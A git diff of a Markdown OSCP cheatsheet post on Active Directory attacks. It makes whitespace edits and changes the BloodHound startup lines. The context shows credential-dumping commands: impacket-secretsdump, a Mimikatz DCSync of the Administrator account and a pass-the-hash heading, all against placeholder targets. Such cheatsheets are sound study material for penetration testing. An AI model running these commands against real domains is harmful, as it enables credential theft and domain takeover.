@@ -1,12 +1,11 @@
 ---
 title: Active Directory
-author: sKyW1per 
+author: sKyW1per
 category: "OSCP"
 date: "2021-03-14 00:01"
 tags: [OSCP, Cheatsheet]
 layout: post
 ---
-
 
 ###### A Few Basic Domain Enumeration Commands
 ```
@@ -30,8 +29,8 @@ $ sudo apt install bloodhound
 $ sudo pip3 install bloodhound
 
 First, gather the data with an ingestor, either the bloodhound-python script from fox-it or SharpHound.Then import the json files in the neo4j database.
-$ (sudo) neo4j console
-starts on localhost:7687
+$ (sudo) neo4j console &
+$ bloodhound &
 
 Examples bloodhound-python:
 $ bloodhound-python -c All -u 'username' -p 'password' -d "domain.local" -ns 10.10.10.10
@@ -135,7 +134,6 @@ $ impacket-secretsdump domain/username:password@10.10.10.10
 with Mimikatz:
 $ lsadump::dcsync /domain:domain.local /user:Administrator
 ```
-
 
 ###### Pass The Hash with CrackMapExec
 ```
